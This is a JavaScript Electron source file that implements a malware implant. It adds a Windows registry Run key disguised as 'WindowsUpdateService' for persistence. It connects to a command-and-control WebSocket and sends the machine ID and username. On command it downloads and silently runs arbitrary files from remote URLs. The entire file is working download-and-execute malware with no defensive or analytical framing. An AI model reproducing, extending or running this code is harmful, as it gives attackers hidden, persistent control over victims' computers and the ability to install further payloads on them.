const { app } = require('electron');
const path = require('path');
const WebSocket = require('ws');
const axios = require('axios');
const fs = require('fs');
const os = require('os');
const { spawn } = require('child_process');
const { machineIdSync } = require('node-machine-id');

app.disableHardwareAcceleration();

function setupPersistence() {
  const exePath = app.getPath('exe');
  const command = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "${exePath}" /f`;
  spawn('cmd.exe', ['/c', command], { detached: true, stdio: 'ignore' }).unref();
}

function startWebSocketClient(retryDelay = 1000) {
  const ws = new WebSocket('wss://localhost:3010/ws');

  ws.on('open', () => {
    const uuid = machineIdSync();
    const username = os.userInfo().username;
    const starttime = Math.floor(Date.now() / 1000);
    ws.send(JSON.stringify({ type: 'register', uuid, username, starttime }));
    ws.pingInterval = setInterval(() => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'ping', uuid, username }));
      }
    }, 15000);
    retryDelay = 1000;
  });

ws.on('message', async (data) => {
  const msg = data.toString().trim();
  console.log("[>] WS Message received:", msg); 
  if (msg.startsWith('download:')) {
    const url = msg.replace('download:', '').trim();
    console.log("[*] Initiating download from:", url); 
    await downloadAndExecute(url);
  }
});


  ws.on('close', () => {
    if (ws.pingInterval) clearInterval(ws.pingInterval);
    setTimeout(() => {
      const nextDelay = Math.min(retryDelay * 2, 30000);
      startWebSocketClient(nextDelay);
    }, retryDelay);
  });

  ws.on('error', () => {});
}


async function downloadAndExecute(url) {
  try {
    const filename = path.basename(url.split('?')[0]);
    const savePath = path.join(app.getPath('temp'), filename);
    console.log(`[+] Saving file to: ${savePath}`);

    const response = await axios({ method: 'GET', url, responseType: 'stream' });
    const writer = fs.createWriteStream(savePath);

    await new Promise((resolve, reject) => {
      response.data.pipe(writer);
      writer.on('finish', resolve);
      writer.on('error', reject);
    });

    console.log(`[+] Download complete. Executing...`);
    spawn(savePath, {
      detached: true,
      stdio: 'ignore',
      shell: true
    }).unref();

  } catch (err) {
    console.error("[!] Download/Execution failed:", err.message);
  }
}


app.whenReady().then(() => {
  setupPersistence();
  startWebSocketClient();
});

app.on('window-all-closed', () => {});
